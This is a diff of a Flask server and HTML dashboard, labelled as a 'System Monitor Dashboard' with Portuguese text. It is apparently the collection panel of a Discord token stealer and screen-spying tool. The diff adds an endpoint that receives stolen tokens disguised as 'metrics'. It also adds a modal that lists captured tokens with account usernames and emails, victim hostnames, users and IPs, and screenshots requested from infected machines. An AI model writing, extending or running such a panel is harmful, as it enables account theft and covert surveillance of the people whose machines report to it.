@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-System Monitor Dashboard - Versão Completa Final
+System Monitor Dashboard - Versão Atualizada com Modal de Dados
 """
 
 import os
@@ -53,6 +53,26 @@ def register_endpoint():
         
         print(f"✅ Endpoint registrado: {endpoint_id}")
         return jsonify({'status': 'success', 'message': 'Endpoint registered'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/metrics', methods=['POST', 'OPTIONS'])
+def receive_metrics():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'success'})
+    
+    try:
+        data = request.json
+        endpoint_id = data.get('endpoint_id', 'unknown')
+        metrics = data.get('metrics', [])
+        
+        for metric in metrics:
+            metric['endpoint_id'] = endpoint_id
+            metric['received_at'] = datetime.now().isoformat()
+            metrics_data.append(metric)
+        
+        print(f"📊 Métricas recebidas de {endpoint_id}: {len(metrics)} itens")
+        return jsonify({'status': 'success'})
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
@@ -160,16 +180,22 @@ def get_stats():
         'last_update': datetime.now().strftime('%H:%M:%S')
     })
 
-@app.route('/api/all_data', methods=['GET', 'OPTIONS'])
-def get_all_data():
+@app.route('/api/endpoint_data/<endpoint_id>', methods=['GET', 'OPTIONS'])
+def get_endpoint_data(endpoint_id):
+    """Retorna todos os dados de um endpoint específico"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'success'})
     
     try:
+        endpoint = endpoints.get(endpoint_id, {})
+        metrics = [m for m in metrics_data if m.get('endpoint_id') == endpoint_id]
+        screenshot = endpoint_screenshots.get(endpoint_id, {})
+        
         return jsonify({
-            'endpoints': list(endpoints.values()),
-            'metrics': metrics_data,
-            'screenshots': endpoint_screenshots
+            'endpoint': endpoint,
+            'metrics': metrics,
+            'screenshot': screenshot,
+            'screenshot_count': len([s for s in endpoint_screenshots if s == endpoint_id])
         })
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -179,7 +205,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Monitor Dashboard - Completo</title>
+    <title>System Monitor Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -224,31 +250,6 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             font-size: 1rem;
             font-weight: 300;
         }
-        .update-time {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 20px;
-            color: #4b5563;
-            font-size: 0.85rem;
-        }
-        .refresh-btn {
-            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
-        }
-        .refresh-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.4);
-        }
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -267,7 +268,6 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         .stat-card:hover {
             border-color: rgba(124, 58, 237, 0.4);
             transform: translateY(-4px);
-            box-shadow: 0 10px 40px rgba(124, 58, 237, 0.15);
         }
         .stat-value {
             font-size: 3rem;
@@ -275,13 +275,10 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            line-height: 1;
-            margin-bottom: 8px;
         }
         .stat-label {
             color: #6b7280;
             font-size: 0.9rem;
-            font-weight: 500;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
@@ -310,15 +307,9 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
             color: white;
             border-color: transparent;
-            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.4);
         }
-        .tab-content {
-            display: none;
-        }
-        .tab-content.active {
-            display: block;
-            animation: fadeIn 0.4s ease;
-        }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.4s ease; }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
@@ -339,7 +330,6 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         .card:hover {
             border-color: rgba(124, 58, 237, 0.3);
             transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
         }
         .card-header {
             display: flex;
@@ -347,11 +337,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             align-items: center;
             margin-bottom: 16px;
         }
-        .card-title {
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #f3f4f6;
-        }
+        .card-title { font-size: 1.1rem; font-weight: 600; color: #f3f4f6; }
         .status-badge {
             padding: 6px 14px;
             border-radius: 20px;
@@ -370,262 +356,104 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             grid-template-columns: repeat(2, 1fr);
             gap: 12px;
         }
-        .info-item {
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-        }
-        .info-label {
-            font-size: 0.75rem;
-            color: #6b7280;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .info-value {
-            font-size: 0.9rem;
-            color: #d1d5db;
-            font-weight: 500;
-        }
-        .token-card {
-            background: rgba(17, 17, 27, 0.6);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
-            border-left: 3px solid #a855f7;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 16px;
-            font-family: 'JetBrains Mono', monospace;
-            transition: all 0.3s ease;
-        }
-        .token-card:hover {
-            border-color: rgba(168, 85, 247, 0.4);
-            transform: translateX(4px);
-        }
-        .token-value {
-            font-size: 0.85rem;
-            color: #a855f7;
-            word-break: break-all;
-            margin-bottom: 10px;
-        }
-        .token-meta {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.75rem;
-            color: #6b7280;
-        }
-        .token-valid {
-            color: #22c55e;
-        }
-        .screenshot-btn {
-            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+        .info-item { display: flex; flex-direction: column; gap: 4px; }
+        .info-label { font-size: 0.75rem; color: #6b7280; text-transform: uppercase; }
+        .info-value { font-size: 0.9rem; color: #d1d5db; font-weight: 500; }
+        .btn-dados {
+            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
             color: white;
             border: none;
-            padding: 12px 24px;
+            padding: 8px 16px;
             border-radius: 8px;
             cursor: pointer;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             font-weight: 500;
+            margin-top: 12px;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
-            margin-bottom: 20px;
         }
-        .screenshot-btn:hover {
+        .btn-dados:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
+            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.4);
         }
-        .screenshot-btn:disabled {
-            background: #4b5563;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        .screen-section {
-            background: rgba(17, 17, 27, 0.6);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
-            border-radius: 20px;
-            padding: 30px;
-        }
-        .screen-controls {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            margin-bottom: 24px;
-        }
-        .screen-select {
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
             width: 100%;
-            max-width: 400px;
-            padding: 14px 18px;
-            background: rgba(10, 10, 15, 0.8);
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background: rgba(17, 17, 27, 0.95);
+            margin: 5% auto;
+            padding: 30px;
             border: 1px solid rgba(124, 58, 237, 0.3);
-            border-radius: 12px;
-            color: #e0e0e0;
-            font-size: 0.95rem;
-            margin-bottom: 24px;
-            cursor: pointer;
-            outline: none;
-        }
-        .screen-select:focus {
-            border-color: #a855f7;
-            box-shadow: 0 0 20px rgba(168, 85, 247, 0.2);
-        }
-        .screen-display {
-            background: rgba(10, 10, 15, 0.9);
-            border-radius: 16px;
-            padding: 20px;
-            text-align: center;
-            min-height: 400px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .live-indicator {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(239, 68, 68, 0.15);
-            color: #ef4444;
-            padding: 8px 16px;
             border-radius: 20px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            margin-bottom: 20px;
-            border: 1px solid rgba(239, 68, 68, 0.3);
+            width: 90%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
         }
-        .live-dot {
-            width: 8px;
-            height: 8px;
-            background: #ef4444;
-            border-radius: 50%;
-            animation: pulse 2s infinite;
+        .modal-close {
+            color: #9ca3af;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            position: absolute;
+            right: 20px;
+            top: 15px;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.8); }
-        }
-        .screen-image {
-            max-width: 100%;
-            max-height: 70vh;
-            border-radius: 12px;
-            border: 1px solid rgba(124, 58, 237, 0.3);
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
-        }
-        .empty-state {
-            color: #4b5563;
-            font-size: 1rem;
-        }
-        .section-title {
+        .modal-close:hover { color: #ef4444; }
+        .modal-title {
             font-size: 1.5rem;
             font-weight: 600;
             color: #f3f4f6;
-            margin-bottom: 24px;
-            padding-left: 12px;
-            border-left: 3px solid #a855f7;
+            margin-bottom: 20px;
+            padding-right: 40px;
         }
         .data-section {
-            background: rgba(17, 17, 27, 0.6);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(124, 58, 237, 0.15);
-            border-radius: 16px;
-            padding: 24px;
-            margin-bottom: 20px;
-        }
-        .data-container {
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        .screenshot-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 20px;
-            margin-top: 20px;
-        }
-        .screenshot-item {
-            background: rgba(10, 10, 15, 0.8);
-            border: 1px solid rgba(124, 58, 237, 0.3);
-            border-radius: 12px;
-            padding: 16px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-        .screenshot-item:hover {
-            border-color: rgba(168, 85, 247, 0.5);
-            transform: translateY(-2px);
-        }
-        .screenshot-img {
-            width: 100%;
-            max-height: 200px;
-            border-radius: 8px;
-            margin-bottom: 12px;
-            object-fit: cover;
-        }
-        .screenshot-info {
-            font-size: 0.85rem;
-            color: #9ca3af;
-        }
-        .screenshot-time {
-            color: #6b7280;
-            font-size: 0.75rem;
-            margin-top: 8px;
-        }
-        .data-card {
-            background: rgba(17, 17, 27, 0.4);
+            background: rgba(10, 10, 15, 0.6);
             border: 1px solid rgba(124, 58, 237, 0.2);
             border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 12px;
-            transition: all 0.3s ease;
+            padding: 20px;
+            margin-bottom: 20px;
         }
-        .data-card:hover {
-            border-color: rgba(168, 85, 247, 0.4);
-            background: rgba(17, 17, 27, 0.6);
-        }
-        .data-card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px;
-            padding-bottom: 8px;
+        .data-section h3 {
+            color: #a855f7;
+            font-size: 1.1rem;
+            margin-bottom: 15px;
             border-bottom: 1px solid rgba(124, 58, 237, 0.2);
-        }
-        .data-card-title {
-            font-weight: 600;
-            color: #f3f4f6;
-        }
-        .data-card-status {
-            padding: 4px 8px;
-            border-radius: 12px;
-            font-size: 0.7rem;
-            font-weight: 600;
-        }
-        .status-online {
-            background: rgba(34, 197, 94, 0.2);
-            color: #22c55e;
-        }
-        .data-card-content {
-            font-size: 0.9rem;
-            color: #d1d5db;
-            line-height: 1.5;
+            padding-bottom: 10px;
         }
         .data-item {
             display: flex;
             justify-content: space-between;
-            padding: 4px 0;
+            padding: 8px 0;
             border-bottom: 1px solid rgba(124, 58, 237, 0.1);
         }
-        .data-label {
-            color: #9ca3af;
-            font-weight: 500;
+        .data-item:last-child { border-bottom: none; }
+        .data-label { color: #9ca3af; font-weight: 500; }
+        .data-value { color: #f3f4f6; font-weight: 600; }
+        .token-display {
+            background: rgba(168, 85, 247, 0.1);
+            border: 1px solid rgba(168, 85, 247, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 8px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: #a855f7;
+            word-break: break-all;
         }
-        .data-value {
-            color: #f3f4f6;
-            font-weight: 600;
-        }
-        @media (max-width: 768px) {
-            .stats-grid { grid-template-columns: 1fr; }
-            .cards-grid { grid-template-columns: 1fr; }
-            .header h1 { font-size: 2rem; }
+        .screenshot-img {
+            max-width: 100%;
+            border-radius: 8px;
+            border: 1px solid rgba(124, 58, 237, 0.3);
         }
     </style>
 </head>
@@ -634,11 +462,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
     <div class="container">
         <div class="header">
             <h1>System Monitor Dashboard</h1>
-            <p>Monitoramento Completo</p>
-            <div class="update-time">
-                <button class="refresh-btn" onclick="location.reload()">Atualizar</button>
-                <span id="updateTime">--:--:--</span>
-            </div>
+            <p>Monitoramento de Endpoints</p>
         </div>
         <div class="stats-grid">
             <div class="stat-card">
@@ -651,7 +475,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             </div>
             <div class="stat-card">
                 <div class="stat-value" id="totalMetrics">0</div>
-                <div class="stat-label">Metricas</div>
+                <div class="stat-label">Métricas</div>
             </div>
             <div class="stat-card">
                 <div class="stat-value" id="totalScreenshots">0</div>
@@ -660,71 +484,43 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         </div>
         <div class="tabs-container">
             <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
-            <button class="tab" onclick="showTab('metrics')">Metricas</button>
-            <button class="tab" onclick="showTab('remote')">Acesso Remoto</button>
-            <button class="tab" onclick="showTab('data')">Ver Dados</button>
+            <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
         </div>
         <div id="endpoints" class="tab-content active">
-            <h2 class="section-title">Endpoints Monitorados</h2>
+            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
             <div class="cards-grid" id="endpointsList">
-                <div class="empty-state">Carregando...</div>
+                <div style="color: #6b7280; text-align: center; padding: 40px;">Carregando...</div>
             </div>
         </div>
-        <div id="metrics" class="tab-content">
-            <h2 class="section-title">Metricas de Autenticacao</h2>
-            <div id="metricsList">
-                <div class="empty-state">Carregando...</div>
-            </div>
-        </div>
-        <div id="remote" class="tab-content">
-            <h2 class="section-title">Screenshot Manual</h2>
-            <div class="screen-section">
-                <div class="screen-controls">
-                    <select id="endpointSelect" class="screen-select" onchange="selectEndpoint()">
-                        <option value="">Selecione um endpoint...</option>
-                    </select>
-                    <button id="screenshotBtn" class="screenshot-btn" onclick="requestScreenshot()" disabled>
-                        📸 Capturar Screenshot
-                    </button>
-                </div>
-                <div class="screen-display" id="screenContent">
-                    <div class="empty-state">Selecione um endpoint para visualizar</div>
-                </div>
-            </div>
-        </div>
-        <div id="data" class="tab-content">
-            <h2 class="section-title">Todos os Dados Capturados</h2>
-            <div style="margin-bottom: 30px;">
-                <button class="refresh-btn" onclick="loadAllData()">🔄 Atualizar Dados</button>
-            </div>
-            
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
-                <div class="data-section">
-                    <h3 style="color: #a855f7; margin-bottom: 20px; font-size: 1.3rem;">🖥️ Endpoints Conectados</h3>
-                    <div id="dataEndpoints" class="data-container">
-                        <div class="empty-state">Carregando...</div>
-                    </div>
-                </div>
-                <div class="data-section">
-                    <h3 style="color: #a855f7; margin-bottom: 20px; font-size: 1.3rem;">🔑 Tokens Discord</h3>
-                    <div id="dataMetrics" class="data-container">
-                        <div class="empty-state">Carregando...</div>
-                    </div>
-                </div>
-            </div>
-            <div class="data-section" style="margin-top: 30px;">
-                <h3 style="color: #a855f7; margin-bottom: 20px; font-size: 1.3rem;">📸 Screenshots Capturados</h3>
-                <div id="dataScreenshots" class="screenshot-grid">
-                    <div class="empty-state">Nenhum screenshot capturado ainda</div>
+        <div id="screenshot" class="tab-content">
+            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
+            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
+                <select id="endpointSelect" style="width: 100%; max-width: 400px; padding: 14px; background: rgba(10, 10, 15, 0.8); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; color: #e0e0e0; font-size: 0.95rem; margin-bottom: 20px; cursor: pointer;" onchange="selectEndpoint()">
+                    <option value="">Selecione um endpoint...</option>
+                </select>
+                <button id="screenshotBtn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; margin-bottom: 20px;" onclick="requestScreenshot()" disabled>📸 Capturar Screenshot</button>
+                <div id="screenContent" style="background: rgba(10, 10, 15, 0.9); border-radius: 16px; padding: 20px; text-align: center; min-height: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+                    <div style="color: #6b7280;">Selecione um endpoint para visualizar</div>
                 </div>
             </div>
         </div>
     </div>
+
+    <!-- Modal de Dados -->
+    <div id="dataModal" class="modal">
+        <div class="modal-content">
+            <span class="modal-close" onclick="closeModal()">&times;</span>
+            <div class="modal-title" id="modalTitle">Dados do Endpoint</div>
+            <div id="modalBody">
+                <!-- Conteúdo dinâmico -->
+            </div>
+        </div>
+    </div>
+
     <script>
         const canvas = document.getElementById('particles-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
-        let currentEndpoint = null;
         
         function resizeCanvas() {
             canvas.width = window.innerWidth;
@@ -764,28 +560,9 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             for (let i = 0; i < count; i++) particles.push(new Particle());
         }
         
-        function drawConnections() {
-            for (let i = 0; i < particles.length; i++) {
-                for (let j = i + 1; j < particles.length; j++) {
-                    const dx = particles[i].x - particles[j].x;
-                    const dy = particles[i].y - particles[j].y;
-                    const dist = Math.sqrt(dx * dx + dy * dy);
-                    if (dist < 100) {
-                        ctx.beginPath();
-                        ctx.strokeStyle = `rgba(168, 85, 247, ${0.1 * (1 - dist / 100)})`;
-                        ctx.lineWidth = 0.5;
-                        ctx.moveTo(particles[i].x, particles[i].y);
-                        ctx.lineTo(particles[j].x, particles[j].y);
-                        ctx.stroke();
-                    }
-                }
-            }
-        }
-        
         function animateParticles() {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
             particles.forEach(p => { p.update(); p.draw(); });
-            drawConnections();
             requestAnimationFrame(animateParticles);
         }
         
@@ -797,10 +574,6 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
             event.target.classList.add('active');
             document.getElementById(tabName).classList.add('active');
-        }
-        
-        function updateTime() {
-            document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
         }
         
         async function loadStats() {
@@ -822,7 +595,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 const select = document.getElementById('endpointSelect');
                 
                 if (endpoints.length === 0) {
-                    container.innerHTML = '<div class="empty-state">Nenhum endpoint conectado</div>';
+                    container.innerHTML = '<div style="color: #6b7280; text-align: center; padding: 40px;">Nenhum endpoint conectado</div>';
                     return;
                 }
                 
@@ -843,6 +616,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                             <div class="info-item"><span class="info-label">RAM</span><span class="info-value">${e.ram}</span></div>
                             <div class="info-item"><span class="info-label">Ultimo Acesso</span><span class="info-value">${e.last_seen}</span></div>
                         </div>
+                        <button class="btn-dados" onclick="showEndpointData('${e.id}', '${e.hostname}')">📊 Ver Dados</button>
                     </div>`;
                 }).join('');
                 
@@ -850,31 +624,62 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             } catch(e) {}
         }
         
-        async function loadMetrics() {
+        async function showEndpointData(endpointId, hostname) {
             try {
-                const res = await fetch('/api/metrics');
-                const metrics = await res.json();
-                const container = document.getElementById('metricsList');
+                const res = await fetch(`/api/endpoint_data/${endpointId}`);
+                const data = await res.json();
                 
-                if (metrics.length === 0) {
-                    container.innerHTML = '<div class="empty-state">Nenhuma metrica recebida</div>';
-                    return;
+                document.getElementById('modalTitle').textContent = `Dados de ${hostname}`;
+                
+                let html = '';
+                
+                // Endpoint Info
+                if (data.endpoint) {
+                    html += `<div class="data-section"><h3>🖥️ Informações do Sistema</h3>`;
+                    Object.entries(data.endpoint).forEach(([key, value]) => {
+                        if (key !== 'id') {
+                            html += `<div class="data-item"><span class="data-label">${key}</span><span class="data-value">${value}</span></div>`;
+                        }
+                    });
+                    html += '</div>';
                 }
                 
-                container.innerHTML = metrics.map(m => {
-                    const acc = m.account || {};
-                    const accInfo = acc.username ? `${acc.username} | ${acc.email || 'sem email'} ${acc.premium_type ? '| Nitro' : ''}` : 'Token invalido';
-                    return `
-                    <div class="token-card">
-                        <div class="token-value">${m.token}</div>
-                        <div class="token-meta">
-                            <span>${m.endpoint_id} | ${m.source}</span>
-                            <span class="${m.valid ? 'token-valid' : ''}">${m.valid ? 'Valido' : 'Invalido'}</span>
-                        </div>
-                        <div style="margin-top: 8px; color: #22c55e; font-size: 0.8rem;">${accInfo}</div>
-                    </div>`;
-                }).join('');
-            } catch(e) {}
+                // Metrics/Tokens
+                if (data.metrics && data.metrics.length > 0) {
+                    html += `<div class="data-section"><h3>🔑 Tokens Capturados (${data.metrics.length})</h3>`;
+                    data.metrics.forEach(m => {
+                        html += `<div class="token-display">${m.token || 'N/A'}</div>`;
+                        if (m.account) {
+                            html += `<div style="color: #22c55e; font-size: 0.85rem; margin-bottom: 12px;">${m.account.username || ''} | ${m.account.email || ''}</div>`;
+                        }
+                    });
+                    html += '</div>';
+                }
+                
+                // Screenshot
+                if (data.screenshot && data.screenshot.image) {
+                    html += `<div class="data-section"><h3>📸 Screenshot</h3>`;
+                    html += `<img class="screenshot-img" src="data:image/png;base64,${data.screenshot.image}" alt="Screenshot">`;
+                    html += `<div style="color: #6b7280; font-size: 0.8rem; margin-top: 8px;">Capturado em: ${new Date(data.screenshot.timestamp).toLocaleString()}</div>`;
+                    html += '</div>';
+                }
+                
+                document.getElementById('modalBody').innerHTML = html || '<div style="color: #6b7280;">Nenhum dado capturado ainda</div>';
+                document.getElementById('dataModal').style.display = 'block';
+            } catch(e) {
+                console.error('Erro ao carregar dados:', e);
+            }
+        }
+        
+        function closeModal() {
+            document.getElementById('dataModal').style.display = 'none';
+        }
+        
+        window.onclick = function(event) {
+            const modal = document.getElementById('dataModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
         }
         
         async function selectEndpoint() {
@@ -882,13 +687,12 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             const screenshotBtn = document.getElementById('screenshotBtn');
             
             if (!endpointId) {
-                document.getElementById('screenContent').innerHTML = '<div class="empty-state">Selecione um endpoint para visualizar</div>';
+                document.getElementById('screenContent').innerHTML = '<div style="color: #6b7280;">Selecione um endpoint para visualizar</div>';
                 screenshotBtn.disabled = true;
                 return;
             }
             
             screenshotBtn.disabled = false;
-            currentEndpoint = endpointId;
             await loadScreen();
         }
         
@@ -901,30 +705,19 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             btn.textContent = '📸 Capturando...';
             
             try {
-                const res = await fetch(`/api/request_screenshot/${endpointId}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' }
-                });
-                const data = await res.json();
+                await fetch(`/api/request_screenshot/${endpointId}`, { method: 'POST' });
+                document.getElementById('screenContent').innerHTML = '<div style="color: #22c55e;">✅ Screenshot solicitado! Aguarde...</div>';
                 
-                if (data.status === 'success') {
-                    document.getElementById('screenContent').innerHTML = `
-                        <div style="color: #22c55e; margin-bottom: 20px;">✅ Screenshot solicitado! Aguarde...</div>
-                        <div class="live-indicator"><span class="live-dot"></span><span>PROCESSANDO</span></div>
-                    `;
-                    
-                    let attempts = 0;
-                    const checkInterval = setInterval(async () => {
-                        attempts++;
-                        await loadScreen();
-                        
-                        if (attempts >= 20 || document.querySelector('.screen-image')) {
-                            clearInterval(checkInterval);
-                            btn.disabled = false;
-                            btn.textContent = '📸 Capturar Screenshot';
-                        }
-                    }, 1000);
-                }
+                let attempts = 0;
+                const interval = setInterval(async () => {
+                    attempts++;
+                    await loadScreen();
+                    if (attempts >= 15) {
+                        clearInterval(interval);
+                        btn.disabled = false;
+                        btn.textContent = '📸 Capturar Screenshot';
+                    }
+                }, 1000);
             } catch (error) {
                 document.getElementById('screenContent').innerHTML = `<div style="color: #ef4444;">❌ Erro: ${error.message}</div>`;
                 btn.disabled = false;
@@ -941,66 +734,18 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 const data = await res.json();
                 if (data.image) {
                     document.getElementById('screenContent').innerHTML = `
-                        <div class="live-indicator"><span class="live-dot"></span><span>LIVE</span></div>
-                        <img class="screen-image" src="data:image/png;base64,${data.image}" alt="Visualizacao remota">
+                        <div style="display: inline-flex; align-items: center; gap: 8px; background: rgba(239, 68, 68, 0.15); color: #ef4444; padding: 8px 16px; border-radius: 20px; font-size: 0.8rem; font-weight: 600; margin-bottom: 20px; border: 1px solid rgba(239, 68, 68, 0.3);"><span style="width: 8px; height: 8px; background: #ef4444; border-radius: 50%;"></span><span>LIVE</span></div>
+                        <img style="max-width: 100%; max-height: 70vh; border-radius: 12px; border: 1px solid rgba(124, 58, 237, 0.3);" src="data:image/png;base64,${data.image}" alt="Screenshot">
                     `;
                 }
             } catch(e) {}
         }
         
-        async function loadAllData() {
-            try {
-                const res = await fetch('/api/all_data');
-                const data = await res.json();
-                
-                // Endpoints
-                const endpointsContainer = document.getElementById('dataEndpoints');
-                if (data.endpoints.length === 0) {
-                    endpointsContainer.innerHTML = '<div class="empty-state">Nenhum endpoint conectado</div>';
-                } else {
-                    endpointsContainer.innerHTML = data.endpoints.map(e => `
-                        <div class="data-card">
-                            <div class="data-card-header">
-                                <span class="data-card-title">${e.hostname}</span>
-                                <span class="data-card-status status-online">${e.status}</span>
-                            </div>
-                            <div class="data-card-content">
-                                <div class="data-item"><span class="data-label">Usuário:</span><span class="data-value">${e.user}</span></div>
-                                <div class="data-item"><span class="data-label">IP:</span><span class="data-value">${e.external_ip}</span></div>
-                                <div class="data-item"><span class="data-label">Sistema:</span><span class="data-value">${e.platform}</span></div>
-                            </div>
-                        </div>
-                    `).join('');
-                }
-                
-                // Screenshots
-                const screenshotsContainer = document.getElementById('dataScreenshots');
-                const screenshots = Object.entries(data.screenshots || {});
-                if (screenshots.length === 0) {
-                    screenshotsContainer.innerHTML = '<div class="empty-state">Nenhum screenshot capturado ainda</div>';
-                } else {
-                    screenshotsContainer.innerHTML = screenshots.map(([id, s]) => `
-                        <div class="screenshot-item">
-                            <img class="screenshot-img" src="data:image/png;base64,${s.image}" alt="Screenshot">
-                            <div class="screenshot-info">${id}</div>
-                            <div class="screenshot-time">${new Date(s.timestamp).toLocaleString()}</div>
-                        </div>
-                    `).join('');
-                }
-            } catch(e) {}
-        }
-        
-        // Inicialização
         loadStats();
         loadEndpoints();
-        loadMetrics();
-        updateTime();
-        
         setInterval(() => {
             loadStats();
             loadEndpoints();
-            loadMetrics();
-            updateTime();
         }, 5000);
     </script>
 </body>
@@ -1009,5 +754,5 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"🚀 Servidor Completo Final iniciando na porta {port}")
+    print(f"🚀 Servidor atualizado iniciando na porta {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
